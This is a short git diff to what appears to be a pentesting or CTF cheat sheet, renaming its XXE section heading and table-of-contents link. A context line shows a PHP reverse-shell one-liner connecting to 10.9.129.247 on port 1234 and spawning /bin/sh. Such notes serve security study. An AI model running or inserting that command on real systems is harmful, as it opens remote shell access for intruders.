@@ -44,7 +44,7 @@
 		- [View access.log](#view-accesslog)
 		- [Command injection](#command-injection)
 	- [SSTI](#ssti)
-	- [XXE](#xxe)
+	- [XML external entity (XXE) injection](#xml-external-entity-xxe-injection)
 	- [Websites](#websites)
 
 ## Scan
@@ -414,7 +414,7 @@ php -r '$sock=fsockopen("10.9.129.247",1234);exec("/bin/sh -i <&3 >&3 2>&3");
 Server-Side Template Injection
 ![SSTI](images/ssti.png)
 
-## XXE
+## XML external entity (XXE) injection
 
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
